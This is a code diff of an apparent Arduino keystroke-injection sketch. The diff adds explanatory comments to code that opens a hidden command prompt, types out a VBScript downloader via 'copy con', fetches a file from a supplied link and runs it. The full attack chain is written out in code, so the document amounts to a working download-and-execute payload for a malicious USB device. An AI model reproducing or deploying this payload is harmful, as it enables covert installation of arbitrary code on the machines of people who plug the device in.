@@ -43,15 +43,18 @@ void setup() {
   
   delay(1000);
   
-  // windows key + R = run
+  // Open up the command prompt in a hidden fashion.
   RunCommand("cmd /Q /D /T:7F /F:OFF /V:ON /K");
   
   delay(500);
   
+  // Delete the script if it exists.
   TypeLn("del download.vbs");
   
+  // Start recording what's typed.
   TypeLn("copy con download.vbs");
   
+  // Start typing the download script.
   TypeLn("Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))");
   
   TypeLn("Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\"):objXMLHTTP.open \"GET\", args(0), false:objXMLHTTP.send()");
@@ -68,12 +71,15 @@ void setup() {
   
   TypeLn("End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing");
   
+  // Save the screen contents.
   Ctrl(KEY_Z);
   
   PressKey(KEY_ENTER, 1);
   
+  // Download our file using our script.
   TypeLn("cscript download.vbs " + fileLink);
   
+  // Execute the file and then exit.
   TypeLn(fileName + " && exit");
     
 }
